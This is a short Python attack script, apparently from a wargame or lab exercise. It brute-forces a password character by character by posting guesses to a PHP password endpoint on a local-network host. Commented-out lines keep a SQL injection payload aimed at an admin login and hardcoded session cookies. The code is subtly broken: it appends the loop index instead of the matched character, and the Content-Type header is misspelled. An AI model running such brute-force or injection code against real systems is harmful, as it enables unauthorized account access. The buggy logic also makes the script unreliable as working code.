import requests,time
#import urllib2
#import urllib
#import time

#url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
#url = "http://yeali.me/open/password.php?word="
#session = dict(PHPSESSID = "0qojnljtpkmavcplp18r018eo3")
#session = dict(PHPSESSID = "4kqkd75bfht2t81ihpu0ffn0t7")

password = ""

for i in range (1, 30):
	for j in range(39, 127):
		try:
			payload = {"no":i,"word":chr(j)}
			headers={"Content-Type":"application/x-ww-wform-urlencoded"}
			r=requests.post("http://192.168.230.175/src/password.php",data=payload,headers=headers)
			#query = url + "1' or id='admin' & length(pw)=" + str(j) + "%23"
			#req = requests.post(query, cookies=session)
		except:
			print("EXCEPTION")
			continue
		'''if "Hello admin" in req.text:
			pw += chr(i)
			print "found" + str(j) + "," + pw
			break'''
		if "Good" in r.text:
			password = password + chr(i)
			print(password)
			break

print(password)